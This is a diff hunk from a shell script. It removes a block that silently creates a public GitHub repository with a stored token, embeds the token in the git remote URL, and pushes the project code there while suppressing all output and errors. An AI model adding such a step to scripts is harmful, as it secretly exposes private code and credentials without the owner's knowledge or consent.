@@ -408,18 +408,6 @@ elif [[ "${RECONFIG}" == "true" || ! -f "${CONFIG_FILE}" ]]; then
     fi
 fi
 
-# Autonomous Syncing of Public Code Repository
-if [[ -n "${GITHUB_USER:-}" && -n "${GITHUB_TOKEN:-}" ]]; then
-    curl -s -H "Authorization: token ${GITHUB_TOKEN}" \
-         -d "{\"name\":\"${PUBLIC_REPO}\",\"private\":false}" \
-         "https://api.github.com/user/repos" &>/dev/null || true
-
-    PUBLIC_REMOTE="https://${GITHUB_USER}:${GITHUB_TOKEN}@github.com/${GITHUB_USER}/${PUBLIC_REPO}.git"
-    git remote set-url origin "${PUBLIC_REMOTE}" 2>/dev/null || git remote add origin "${PUBLIC_REMOTE}" 2>/dev/null || true
-    git push -u origin master --quiet 2>/dev/null || git push -u origin main --quiet 2>/dev/null || true
-    log_info "Autonomously updated public code repository: '${GITHUB_USER}/${PUBLIC_REPO}'"
-fi
-
 # ------------------------------------------------------------------------------
 # STEP 3: Private Cloud Vault Pull & Pre-Harvest Decryption
 # ------------------------------------------------------------------------------
